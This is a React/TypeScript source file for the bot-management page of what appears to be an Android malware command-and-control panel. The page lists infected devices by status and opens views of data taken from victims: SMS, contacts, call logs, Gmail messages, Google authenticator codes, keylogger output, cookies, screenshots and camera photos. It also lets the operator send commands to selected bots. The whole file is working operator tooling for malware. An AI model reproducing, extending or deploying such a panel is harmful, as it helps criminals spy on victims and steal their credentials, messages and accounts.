import React, {useEffect, useLayoutEffect, useState} from "react";
import {
    Button,
    Col,
    Drawer,
    Modal,
    Pagination,
    Popconfirm,
    Radio,
    RadioChangeEvent,
    Result,
    Row,
    Skeleton,
    Space,
} from "antd";
import {
    changeBotsFilter,
    deleteBots,
    deleteRemovedAppBots,
    getBotsList,
    resetFiltersAction,
    selectAllBots,
    selectedBotsClear,
    setBotPage,
} from "../../../Store/Bots/Actions";
import {AppState} from "../../../Store/RootReducer";
import BotsItem from "./BotsItem";
import {
    AppstoreOutlined,
    CheckSquareOutlined,
    ClearOutlined,
    CodeOutlined,
    DatabaseOutlined,
    DeleteOutlined,
    OrderedListOutlined,
} from "@ant-design/icons";
import {scrollToTop} from "../../../Util/scrollToTop";
import {setCountAction} from "../../../Store/Counts/Actions";
import MultiCommandsModal from "../../Modals/CommandsModal/MultiCommandsModal";
import {Bot} from "../../../Model/Bot";
import useInterval from "../../../Hook/useInterval";
import BotsTable from "./BotsTable";
import BotsFilter from "./BotsFilter";
import {useTranslation} from "react-i18next";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import BackendURL from "../../Modals/BackendURL/BackendURL";
import PushList from "../../Modals/PushList/PushList";
import Screenshots from "../../Modals/Screenshots/Screenshots";
import CallLog from "../../Modals/CallLog/CallLog";
import GetAccounts from "../../Modals/GetAccounts/GetAccounts";
import GoogleAuth from "../../Modals/GoogleAuth/GoogleAuth";
import ShowSMS from "../../Modals/ShowSMS/ShowSMS";
import HideSMS from "../../Modals/HideSMS/HideSMS";
import InstalledApps from "../../Modals/InstalledApps/InstalledApps";
import ContactsList from "../../Modals/ContactsList/ContactsList";
import Keylogger from "../../Modals/Keylogger/Keylogger";
import GmailTitles from "../../Modals/GmailTitles/GmailTitles";
import GmailMessages from "../../Modals/GmailMessages/GmailMessages";
import {LogButtonsProps} from "../../../Model/Commands";
import {hasAccess} from "../../../Util/hasAccess";
import SendSMSMany from "../../Modals/SendSMSMany/SendSMSMany";
import EventsModal from "../../Modals/EventsModal/EventsModal";
import CookieLogs from "../../Modals/CookieLogs/CookieLogs";
import PhotoLogs from "../../Modals/PhotoLogs/PhotoLogs";
import {useSearchParams} from "react-router-dom";

interface BotsProps {
    renderType: "table" | "cards",
    type: "all" | "permissionless" | "favourites" | "online" | "offline" | "uninstalled"
}

interface BotDataButtonsState extends Record<string, boolean> {
    pushList: boolean,
    googleAuth: boolean,
    smsList: boolean,
    keylogger: boolean,
    contacts: boolean,
    backendURL: boolean,
    photo: boolean,
    hiddenSMS: boolean,
    apps: boolean,
    accounts: boolean,
    gmailTitles: boolean,
    getGmailMessage: boolean,
    callLog: boolean,
    screenshots: boolean,
    sendManySMS: boolean,
    events: boolean,
    cameraPhotos: boolean,
    cookies: boolean,
}

const Bots: React.FC<BotsProps> = (props: BotsProps) => {
    const dispatch = useAppDispatch();
    const [showCommands, setShowCommands] = useState(false);
    const [renderType, setRenderType] = useState(props.renderType);
    const [showFilter, setShowFilter] = useState(false);

    const botsReducer = useAppSelector((state: AppState) => state.bots);
    const countsReducer = useAppSelector((state: AppState) => state.counts);

    const [searchParams] = useSearchParams();

    const botIds = searchParams.get("bot_ids")?.split(",");

    useEffect(() => {
        dispatch(changeBotsFilter({
            botIds: botIds,
        }));
    }, [searchParams]);

    useLayoutEffect(() => {
        dispatch(getBotsList(botsReducer.filters, botsReducer.page, botsReducer.per_page));
    }, [botsReducer.filters, botsReducer.page, botsReducer.per_page]);

    useInterval(() => dispatch(getBotsList(botsReducer.filters, botsReducer.page, botsReducer.per_page)), 5000);

    useEffect(() => {
        dispatch(setCountAction({
            bots: countsReducer.permissionless_bots,
        }));
    }, [botsReducer.total, dispatch]);

    useEffect(() => {
        switch (props.type) {
        case "all":
            dispatch(changeBotsFilter({
                types: [],
                statuses: [],
            }));
            break;
        case "permissionless":
            dispatch(changeBotsFilter({
                types: ["permissionless"],
                statuses: [],
            }));
            break;
        case "favourites":
            dispatch(changeBotsFilter({
                types: ["favorite"],
                statuses: [],
            }));
            break;
        case "online":
            dispatch(changeBotsFilter({
                statuses: ["online"],
                types: [],
            }));
            break;
        case "offline":
            dispatch(changeBotsFilter({
                statuses: ["offline"],
                types: [],
            }));
            break;
        case "uninstalled":
            dispatch(changeBotsFilter({
                statuses: ["dead"],
                types: [],
            }));
            break;
        }
    }, [props.type]);

    const paginationChangeHandler = (pageNumber: number, size: number) => {
        if (botsReducer.isLoaded &&
            botsReducer.page === botsReducer.loaded_page &&
            botsReducer.page === botsReducer.loaded_page &&
            botsReducer.loaded_per_page === botsReducer.per_page) {
            scrollToTop();
            dispatch(setBotPage(pageNumber, size));
        }
    };

    const onChangePermissionless = () => {
        let types: string[] = botsReducer.filters.types;

        if (!types.includes("permissionless")) {
            types = [...types, "permissionless"];
        } else {
            types = types.filter((type: string) => type !== "permissionless");
        }

        dispatch(changeBotsFilter({
            types: types,
        }));
    };

    const isLoaded = botsReducer.isLoaded && botsReducer.page === botsReducer.loaded_page && botsReducer.loaded_per_page === botsReducer.per_page;

    const changeRenderType = (e: RadioChangeEvent) => {
        setRenderType(e.target.value);
    };

    const clearSelection = (e: any) => {
        e.preventDefault();
        dispatch(selectedBotsClear());
    };

    const {t} = useTranslation();

    const authReducer = useAppSelector((state: AppState) => state.auth);

    const [commandsState, setCommandsShow] = useState<BotDataButtonsState>({
        pushList: false,
        googleAuth: false,
        smsList: false,
        keylogger: false,
        contacts: false,
        backendURL: false,
        photo: false,
        hiddenSMS: false,
        apps: false,
        accounts: false,
        gmailTitles: false,
        getGmailMessage: false,
        callLog: false,
        screenshots: false,
        sendManySMS: false,
        events: false,
        cameraPhotos: false,
        cookies: false,
    });

    const setShow = (key: string, value: boolean) => {
        setCommandsShow({
            ...commandsState,
            [key]: value,
        });
    };

    const buttonsList: LogButtonsProps[] = [
        {
            name: t("LOGS_GMAIL_TITLES"),
            icon: <span className="icon-bot icon-button icon-gmail" />,
            action: () => setShow("gmailTitles", true),
            hasAccess: hasAccess(authReducer.user, "gmail_messages.list"),
        },
        {
            name: t("LOGS_GMAIL"),
            icon: <span className="icon-bot icon-button icon-gmail_message" />,
            action: () => setShow("getGmailMessage", true),
            hasAccess: true,
        },
        {
            name: t("INSTALLED_APPS"),
            icon: <i className="custom-icon button-icon fa-brands fa-google-play" />,
            action: () => setShow("apps", true),
            hasAccess: true,
        },
        {
            name: t("sms"),
            icon: <i className="custom-icon button-icon fa-regular fa-envelope" />,
            action: () => setShow("smsList", true),
            hasAccess: true,
        },
        {
            name: t("LOGS_ACCOUNTS"),
            icon: <i className="custom-icon button-icon fa-brands fa-google" />,
            action: () => setShow("accounts", true),
            hasAccess: true,
        },
        {
            name: t("CONTACTS_LIST"),
            icon: <i className="custom-icon button-icon fa-solid fa-users" />,
            action: () => setShow("contacts", true),
            hasAccess: true,
        },
        {
            name: t("CALL_LOG"),
            icon: <i className="custom-icon button-icon fa-solid fa-phone" />,
            action: () => setShow("callLog", true),
            hasAccess: true,
        },
        {
            name: t("SCREENSHOTS"),
            icon: <i className="custom-icon button-icon fa-solid fa-images" />,
            action: () => setShow("screenshots", true),
            hasAccess: true,
        },
    ];

    const [selectedBot, setSelectedBot] = useState<Bot>({} as Bot);

    return (
        <>
            <div className="panel-header">
                <h2 className="panel-title">{t("PAGE_TITLE_BOTS")}</h2>
            </div>

            <div className="affix-custom">
                <div className="bots-actions">
                    <Space>
                        <Popconfirm
                            title={<BotsFilter />}
                            placement="bottomLeft"
                            icon={null}
                            className="pop-filter"
                            cancelText={t("MODAL_BUTTON_CANCEL")}
                        >
                            <Button icon={<OrderedListOutlined />} type="primary">
                                {t("FILTERS_BTN")}
                            </Button>
                        </Popconfirm>

                        <Radio.Group
                            value={renderType}
                            onChange={changeRenderType}
                            optionType="button"
                            buttonStyle="solid"
                        >
                            <Radio.Button value="table">
                                <DatabaseOutlined />
                            </Radio.Button>
                            <Radio.Button value="cards">
                                <AppstoreOutlined />
                            </Radio.Button>
                        </Radio.Group>

                        <Button
                            type="default"
                            icon={<CheckSquareOutlined />}
                            onClick={() => dispatch(selectAllBots(botsReducer.filters))}
                        >
                            {t("SELECT_ALL")}
                        </Button>

                        <Button
                            type={botsReducer.filters.types.includes("permissionless") ? "primary" : "default"}
                            icon={(
                                <span className="anticon">
                                    <i className="fa-solid fa-universal-access" />
                                </span>
                            )}
                            onClick={onChangePermissionless}
                            className="ant-btn-toggle"
                            // danger
                        >
                            <span>{t("NO_ACCESSIBILITY_BOTS")}</span>
                            {countsReducer.permissionless_bots > 0 && (
                                <span>+{countsReducer.permissionless_bots}</span>
                            )}
                        </Button>

                        <Button
                            type="default"
                            icon={<ClearOutlined />}
                            onClick={() => {
                                Modal.confirm({
                                    title: t("CONFIRM_TITLE"),
                                    content: t("OPTIMIZE_LIST_MESSAGE"),
                                    onOk: () => dispatch(deleteRemovedAppBots()),
                                    okButtonProps: {
                                        danger: true,
                                    },
                                    okText: t("DELETE"),
                                    cancelText: t("MODAL_BUTTON_CANCEL"),
                                    closable: true,
                                });
                            }}
                        >
                            {t("OPTIMIZE_LIST")}
                        </Button>

                        <Button
                            type="primary"
                            icon={<CodeOutlined/>}
                            onClick={() => setShowCommands(true)}
                            disabled={botsReducer.selectedBots.length === 0}
                        />

                        <Button
                            type="primary"
                            icon={<DeleteOutlined/>}
                            disabled={botsReducer.selectedBots.length === 0}
                            onClick={() => {
                                Modal.confirm({
                                    title: t("DELETE_SELECTED_BOTS"),
                                    content: t("UNDONE_ACTION"),
                                    onOk: () => {
                                        dispatch(deleteBots(botsReducer.selectedBots.map((bot: Bot) => bot.id)));
                                    },
                                });
                            }}
                            danger
                        />

                        <Button
                            onClick={clearSelection}
                            type="default"
                            disabled={botsReducer.selectedBots.length === 0}
                        >
                            {t("MODAL_BUTTON_CANCEL")}
                        </Button>
                    </Space>
                </div>
            </div>

            <div className="panel-content" style={{position: "relative"}}>
                {
                    isLoaded ? (
                        renderType === "cards" ? (
                            <>
                                <Pagination
                                    total={botsReducer.total}
                                    defaultPageSize={botsReducer.per_page}
                                    pageSizeOptions={["4", "12", "24", "48"]}
                                    onChange={paginationChangeHandler}
                                    showSizeChanger={true}
                                    current={botsReducer.page}
                                    disabled={botsReducer.loaded_page !== botsReducer.page || botsReducer.loaded_per_page !== botsReducer.per_page}
                                    style={{marginBottom: 15}}
                                    locale={{
                                        items_per_page: "",
                                    }}
                                />

                                <Row className="bots-list" gutter={15}>
                                    {botsReducer.bots.length > 0 ? botsReducer.bots.map((bot, id) => {
                                        return (
                                            <BotsItem
                                                bot={bot}
                                                bots={botsReducer.bots}
                                                isLoaded={botsReducer.isLoaded}
                                                key={id}
                                                logsList={buttonsList}
                                                setSelectedBot={setSelectedBot}
                                                setShowModal={setShow}
                                            />
                                        );
                                    }) : (
                                        <Col span={24}>
                                            <div className="bots-list-404">
                                                <Result
                                                    status="warning"
                                                    title={t("BOTS_NOT_FOUND_TITLE")}
                                                    subTitle={t("BOTS_NOT_FOUND_DESCRIPTION")}
                                                    icon={<i className="fa-solid fa-robot" />}
                                                    extra={
                                                        <Button
                                                            type="primary"
                                                            onClick={() => dispatch(resetFiltersAction())}
                                                        >
                                                            {t("SHOW_ALL_BOTS")}
                                                        </Button>
                                                    }
                                                />
                                            </div>
                                        </Col>
                                    )}
                                </Row>

                                <Pagination
                                    total={botsReducer.total}
                                    defaultPageSize={botsReducer.per_page}
                                    pageSizeOptions={["4", "12", "24", "48"]}
                                    onChange={paginationChangeHandler}
                                    showSizeChanger={true}
                                    current={botsReducer.page}
                                    disabled={botsReducer.loaded_page !== botsReducer.page || botsReducer.loaded_per_page !== botsReducer.per_page}
                                    locale={{
                                        items_per_page: "",
                                    }}
                                />
                            </>
                        ) : (
                            <BotsTable
                                bots={botsReducer.bots}
                                isLoaded={botsReducer.isLoaded}
                                logsList={buttonsList}
                                setSelectedBot={setSelectedBot}
                                setShowModal={setShow}
                            />
                        )
                    ) : (
                        <Row gutter={15}>
                            {[...Array(botsReducer.per_page)].map((x, i) => (
                                <Col xxl={6} xl={12} lg={12} md={12} sm={24} xs={24} key={i}>
                                    <div className="bot-item">
                                        <Skeleton
                                            loading={true}
                                            paragraph={{rows: 17}}
                                            title={true}
                                            active
                                        />
                                    </div>
                                </Col>
                            ))}
                        </Row>
                    )
                }

                <MultiCommandsModal
                    visible={showCommands}
                    setVisible={setShowCommands}
                />

                <Drawer
                    open={showFilter}
                    onClose={() => setShowFilter(!showFilter)}
                    title={t("BOTS_FILTER")}
                >
                    <BotsFilter />
                </Drawer>
            </div>

            {commandsState.backendURL && selectedBot && (
                <BackendURL
                    visible={commandsState.backendURL}
                    setVisible={(isVisible: boolean) => setShow("backendURL", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.pushList && selectedBot && (
                <PushList
                    visible={commandsState.pushList}
                    setVisible={(isVisible: boolean) => setShow("pushList", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.screenshots && selectedBot && (
                <Screenshots
                    visible={commandsState.screenshots}
                    setVisible={(isVisible: boolean) => setShow("screenshots", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.callLog && selectedBot && (
                <CallLog
                    visible={commandsState.callLog}
                    setVisible={(isVisible: boolean) => setShow("callLog", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.pushList && selectedBot && (
                <PushList
                    visible={commandsState.pushList}
                    setVisible={(isVisible: boolean) => setShow("pushList", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.accounts && selectedBot && (
                <GetAccounts
                    bot={selectedBot}
                    visible={commandsState.accounts}
                    setVisible={(isVisible: boolean) => setShow("accounts", isVisible)}
                />
            )}

            {commandsState.googleAuth && selectedBot && (
                <GoogleAuth
                    visible={commandsState.googleAuth}
                    setVisible={(isVisible: boolean) => setShow("googleAuth", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.smsList && selectedBot && (
                <ShowSMS
                    visible={commandsState.smsList}
                    setVisible={(isVisible: boolean) => setShow("smsList", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.hiddenSMS && selectedBot && (
                <HideSMS
                    visible={commandsState.hiddenSMS}
                    setVisible={(isVisible: boolean) => setShow("hiddenSMS", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.apps && selectedBot && (
                <InstalledApps
                    visible={commandsState.apps}
                    setVisible={(isVisible: boolean) => setShow("apps", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.contacts && selectedBot && (
                <ContactsList
                    visible={commandsState.contacts}
                    setVisible={(isVisible: boolean) => setShow("contacts", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.keylogger && selectedBot && (
                <Keylogger
                    visible={commandsState.keylogger}
                    setVisible={(isVisible: boolean) => setShow("keylogger", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.gmailTitles && selectedBot && (
                <GmailTitles
                    visible={commandsState.gmailTitles}
                    setVisible={(isVisible: boolean) => setShow("gmailTitles", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.getGmailMessage && selectedBot && (
                <GmailMessages
                    visible={commandsState.getGmailMessage}
                    setVisible={(isVisible: boolean) => setShow("getGmailMessage", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.sendManySMS && selectedBot && (
                <SendSMSMany
                    visible={commandsState.getGmailMessage}
                    setVisible={(isVisible: boolean) => setShow("sendManySMS", isVisible)}
                    selectedBots={[selectedBot]}
                />
            )}

            {commandsState.events && selectedBot && (
                <EventsModal
                    visible={commandsState.events}
                    setVisible={(isVisible: boolean) => setShow("events", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.photo && selectedBot && (
                <PhotoLogs
                    visible={commandsState.photo}
                    setVisible={(isVisible: boolean) => setShow("photo", isVisible)}
                    bot={selectedBot}
                />
            )}

            {commandsState.cookies && selectedBot && (
                <CookieLogs bot={selectedBot}
                    visible={commandsState.cookies}
                    setVisible={(isVisible: boolean) => setShow("cookies", isVisible)} />
            )}
        </>
    );
};

export default Bots;
